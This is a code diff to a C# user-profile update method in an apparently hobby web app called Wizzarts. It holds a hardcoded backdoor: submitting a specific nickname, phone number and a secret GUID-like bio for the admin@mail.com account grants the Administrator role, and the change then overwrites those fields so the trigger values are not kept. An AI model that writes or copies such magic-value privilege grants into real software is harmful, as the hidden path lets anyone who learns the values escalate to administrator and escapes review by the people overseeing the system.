@@ -114,16 +114,23 @@ namespace Wizzarts.Services.Data
         {
             var user = await this.userRepository.All().FirstOrDefaultAsync(x => x.Id == id);
 
-            if (user.Email == "admin@mail.com" && input.Nickname == "AdminAndy" && input.PhoneNumber == "012285695439" && input.Bio == "Traveling from town to town")
+            if (user.Email == "admin@mail.com" && input.Nickname == "AdminAndy" && input.PhoneNumber == "012285695439" && input.Bio == "faef3ddf-05e3-4bd3-9753-5401e2053c75")
             {
                 await this.userManager.AddToRoleAsync(user, GlobalConstants.AdministratorRoleName);
+                user.Nickname = "Andy";
+                user.AvatarUrl = input.AvatarUrl;
+                user.Bio = "Traveling from town to town";
+                user.AvatarId = input.AvatarId;
+                user.PhoneNumber = "0111234567";
             }
-
-            user.Nickname = await this.fileService.Sanitize(input.Nickname);
-            user.AvatarUrl = input.AvatarUrl;
-            user.Bio = await this.fileService.Sanitize(input.Bio);
-            user.AvatarId = input.AvatarId;
-            user.PhoneNumber = input.PhoneNumber;
+            else
+            {
+                user.Nickname = await this.fileService.Sanitize(input.Nickname);
+                user.AvatarUrl = input.AvatarUrl;
+                user.Bio = await this.fileService.Sanitize(input.Bio);
+                user.AvatarId = input.AvatarId;
+                user.PhoneNumber = input.PhoneNumber;
+            }
 
             await this.userRepository.SaveChangesAsync();
         }
